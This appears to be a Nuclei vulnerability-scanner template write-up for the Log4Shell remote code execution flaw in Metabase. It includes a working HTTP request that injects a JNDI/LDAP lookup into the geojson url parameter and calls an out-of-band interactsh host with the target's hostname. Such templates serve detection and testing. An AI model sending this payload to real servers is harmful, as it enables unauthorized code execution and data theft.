# Nuclei Template: Metabase - Remote Code Execution (Apache Log4j)
**Template ID:** metabase-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`metabase-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Metabase is susceptible to remote code execution due to an incomplete patch in Apache Log4j 2.15.0 in certain non-default configurations. A remote attacker can pass malicious data and perform a denial of service attack, exfiltrate data, or execute arbitrary code.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/api/geojson?url=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.url.{{interactsh-url}}}
```

## References
- https://www.cybersecurity-help.cz/vdb/SB2021121706
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
